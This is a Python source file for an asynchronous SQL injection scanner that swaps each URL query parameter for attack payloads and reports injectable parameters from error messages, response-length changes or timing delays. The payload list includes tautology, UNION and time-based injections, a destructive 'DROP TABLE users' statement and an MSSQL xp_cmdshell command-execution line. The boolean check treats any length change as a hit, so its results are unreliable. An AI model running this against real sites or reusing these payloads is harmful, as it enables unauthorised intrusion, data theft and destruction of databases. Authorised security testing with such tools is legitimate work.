import asyncio
import aiohttp
import time
from urllib.parse import urlparse, parse_qs, urlencode

# Enhanced payloads covering different attack vectors
PAYLOADS = [
    "' OR '1'='1--", 
    "' OR 1=1#",
    "' UNION SELECT 1,2,3--",
    "' OR SLEEP(5)--",
    "'; DROP TABLE users--",
    "' OR 1=CAST((SELECT 1 FROM users) AS NUMERIC)--",
    "'; SELECT * FROM users--",
    "'; SELECT pg_sleep(5)--",  # PostgreSQL time-based
    "'; WAITFOR DELAY '0:0:5'--",  # MSSQL time-based
    "'; SELECT SLEEP(5)--",
    "'; SELECT 1 WHERE 1=1 AND SLEEP(5)--",
    "'; SELECT 1; EXEC xp_cmdshell 'ping 127.0.0.1'--"
]

# Expanded error keywords for better DBMS detection
ERROR_KEYWORDS = [
    "SQL syntax", 
    "database error", 
    "syntax error", 
    "ORA-", 
    "PostgreSQL", 
    "pg_", 
    "Microsoft SQL Server", 
    "MySQL", 
    "Unclosed quotation mark", 
    "You have an error in your SQL syntax"
]

async def run_sqlmap_alt(target_url: str):
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        return {"status": "success", "message": "No parameters found"}

    async with aiohttp.ClientSession() as session:
        try:
            original_resp = await session.get(target_url, timeout=5)
            original_response = await original_resp.text()
        except:
            return {"status": "error", "message": "Connection failed"}

        async def test_parameter(param, session, original_response):
            original_value = parse_qs(urlparse(target_url).query)[param][0]

            async def send_request(payload):
                modified_params = {k: v for k, v in parse_qs(urlparse(target_url).query).items()}
                modified_params[param] = [payload]
                
                modified_url = parsed_url._replace(
                    query=urlencode(modified_params, doseq=True)
                ).geturl()
                
                try:
                    start_time = time.time()
                    async with session.get(modified_url, timeout=15) as resp:
                        response_text = await resp.text()
                        duration = time.time() - start_time
                        return response_text, duration, modified_url
                except Exception as e:
                    return None, None, None

            for payload in PAYLOADS:
                response_text, duration, modified_url = await send_request(payload)
                
                if not response_text:
                    continue

                # Error-based detection
                if any(kw in response_text for kw in ERROR_KEYWORDS):
                    dbms = next((kw for kw in ERROR_KEYWORDS if kw in response_text), None)
                    return {
                        "vulnerable": True,
                        "type": "error-based",
                        "dbms": dbms,
                        "payload": payload,
                        "url": modified_url
                    }

                # Boolean-based detection
                if len(response_text) != len(original_response):
                    return {
                        "vulnerable": True,
                        "type": "boolean-based",
                        "payload": payload,
                        "url": modified_url
                    }

                # Time-based detection
                if duration > 4 and "SLEEP" in payload:
                    return {
                        "vulnerable": True,
                        "type": "time-based",
                        "payload": payload,
                        "url": modified_url
                    }

            return {"vulnerable": False}

        # Run all parameters in parallel
        tasks = [test_parameter(param, session, original_response) for param in query_params]
        try:
            results = await asyncio.gather(*tasks)
        except Exception as e:
            return {"status": "error", "message": f"Scan error: {str(e)}"}

        # Map results back to parameters
        scan_results = {}
        params_list = list(query_params.keys())
        for idx, result in enumerate(results):
            param = params_list[idx]
            if result.get("vulnerable"):
                scan_results[param] = result

    return {
        "status": "success",
        "message": "Scan completed",
        "target_url": target_url,
        "scan_results": scan_results
    }

